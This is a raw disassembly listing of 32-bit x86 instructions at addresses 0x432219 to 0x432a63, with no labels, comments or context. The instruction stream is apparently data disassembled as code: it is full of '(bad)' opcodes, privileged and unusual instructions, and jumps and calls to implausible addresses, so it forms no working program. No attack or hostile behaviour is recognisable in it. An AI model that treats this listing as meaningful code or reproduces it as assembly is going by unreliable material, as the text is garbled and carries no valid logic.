  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
  43298e:	or     cl,al
  432990:	inc    ebp
  432991:	dec    ebp
  432992:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432998:	or     WORD PTR [ecx],0x899b
  43299d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329a3:	mov    edx,DWORD PTR [ecx+0x8]
  4329a6:	mov    eax,DWORD PTR [ebp-0x8]
  4329a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329b6:	inc    ebp
  4329b7:	dec    eax
  4329b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329be:	add    edx,DWORD PTR [ecx-0x8]
  4329c1:	mov    ecx,DWORD PTR [ecx]
  4329c3:	clc    
  4329c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329cb:	mov    ecx,ebp
  4329cd:	clc    
  4329ce:	(bad)  
  4329cf:	popf   
  4329d0:	inc    DWORD PTR [eax]
  4329d2:	ret    0x8b
  4329d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329db:	mov    edi,esp
  4329dd:	hlt    
  4329de:	test   ecx,esi
  4329e0:	clc    
  4329e1:	or     BYTE PTR [ebp+0x7],al
  4329e4:	xor    al,cl
  4329e6:	pushf  
  4329e7:	jb     0x432a1c
  4329e9:	add    BYTE PTR [eax-0x3f],al
  4329ec:	inc    eax
  4329ed:	daa    
  4329ee:	inc    ebp
  4329ef:	inc    ebp
  4329f0:	xor    eax,0x7f80803
  4329f5:	dec    ebp
  4329f6:	fwait
  4329f7:	add    esi,DWORD PTR [edx]
  4329f9:	clc    
  4329fa:	cmp    DWORD PTR [ecx],ecx
  4329fc:	or     al,0x8
  4329fe:	add    al,BYTE PTR [ebp+0x2c]
  432a01:	xor    eax,0x7350845
  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
